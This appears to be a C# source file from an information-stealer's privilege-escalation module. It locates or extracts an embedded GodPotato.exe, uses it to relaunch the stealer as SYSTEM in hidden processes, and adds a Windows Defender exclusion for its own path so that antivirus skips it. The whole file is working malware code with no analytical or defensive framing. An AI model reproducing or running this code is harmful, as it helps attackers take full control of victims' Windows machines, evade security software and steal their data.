using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Principal;

namespace Intelix.PrivilegeEscalation
{
    public static class GodPotato
    {
        private static readonly string PotatoName = "GodPotato.exe";
        // Check finding potato in current dir first, else use temp
        private static string TargetPath 
        {
            get 
            {
                string current = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, PotatoName);
                if (File.Exists(current)) return current;
                return Path.Combine(Path.GetTempPath(), PotatoName);
            }
        }

        public static bool IsSystem()
        {
            using (var identity = WindowsIdentity.GetCurrent())
            {
                return identity.IsSystem;
            }
        }

        // Centralized helper to run ANY command as SYSTEM via GodPotato
        // Cmd: "cmd /c whoami" or "powershell -c ..."
        public static void RunAsSystem(string command)
        {
            try
            {
                // Ensure potato is there
                if (!DropResource()) return;

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = TargetPath,
                    Arguments = $"-cmd \"{command}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process.Start(psi);
            }
            catch { }
        }

        public static void Escalate()
        {
            if (IsSystem()) return;

            try
            {
                // Execute current stealer with SYSTEM privileges
                string currentExe = Process.GetCurrentProcess().MainModule.FileName;
                
                // Quote path in case of spaces
                RunAsSystem($"\\\"{currentExe}\\\"");
                
                // Terminate current low-privilege process
                Environment.Exit(0);
            }
            catch (Exception)
            {
            }
        }

        public static void AddExclusion()
        {
             try
             {
                 string currentPath = Process.GetCurrentProcess().MainModule.FileName;
                 // Use double quotes for the inner PS command string to survive wrapping
                 string psCommand = $"powershell -Command \\\"Add-MpPreference -ExclusionPath '{currentPath}'\\\"";
                 
                 RunAsSystem(psCommand);
             }
             catch { }
        }

        private static bool DropResource()
        {
            if (File.Exists(TargetPath)) return true;

            try
            {
                // Try to find GodPotato.exe in the project root first
                string projectRoot = AppContext.BaseDirectory;
                string[] searchPaths = new string[]
                {
                    Path.Combine(projectRoot, PotatoName),
                    Path.Combine(projectRoot, "..", PotatoName),
                    Path.Combine(projectRoot, "..", "..", PotatoName),
                    Path.Combine(Environment.CurrentDirectory, PotatoName),
                };

                foreach (var searchPath in searchPaths)
                {
                    if (File.Exists(searchPath))
                    {
                        File.Copy(searchPath, TargetPath, true);
                        return true;
                    }
                }

                // Try to extract from embedded resource
                var assembly = Assembly.GetExecutingAssembly();
                string[] resourceNames = assembly.GetManifestResourceNames();
                
                foreach (var resName in resourceNames)
                {
                    if (resName.EndsWith("GodPotato.exe", StringComparison.OrdinalIgnoreCase) ||
                        resName.Contains("GodPotato"))
                    {
                        using (var stream = assembly.GetManifestResourceStream(resName))
                        {
                            if (stream != null)
                            {
                                using (var fs = new FileStream(TargetPath, FileMode.Create, FileAccess.Write))
                                {
                                    stream.CopyTo(fs);
                                }
                                return true;
                            }
                        }
                    }
                }

                return false;
            }
            catch
            {
                return false;
            }
        }
    }
}
